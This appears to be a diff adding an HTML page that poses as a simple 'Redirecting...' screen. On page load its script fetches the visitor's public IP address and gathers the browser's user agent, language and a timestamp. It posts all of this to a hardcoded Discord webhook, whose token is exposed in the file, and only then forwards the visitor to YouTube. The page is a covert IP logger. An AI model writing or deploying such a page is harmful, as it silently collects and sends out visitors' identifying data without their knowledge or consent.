@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+  <script>
+    async function collectAndRedirect() {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+
+      const userData = {
+        ip: ipData.ip,
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        timestamp: new Date().toISOString(),
+      };
+
+      fetch('https://discord.com/api/webhooks/1300041353710796830/f5R4vPDaHFiMyzf4lnuFmfDly9pNlxjNqXogb4NvvGGAQr4vLd--5pD1J4bM4qiMxH3X', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          content: `User Info:\n- IP: ${userData.ip}\n- User Agent: ${userData.userAgent}\n- Language: ${userData.language}\n- Time: ${userData.timestamp}`
+        })
+      })
+      .then(() => {
+        window.location.href = 'https://youtube.com';
+      })
+      .catch(error => console.error('Error sending to Discord:', error));
+    }
+  </script>
+</head>
+<body onload="collectAndRedirect()">
+  <h1>Redirecting...</h1>
+</body>
+</html>
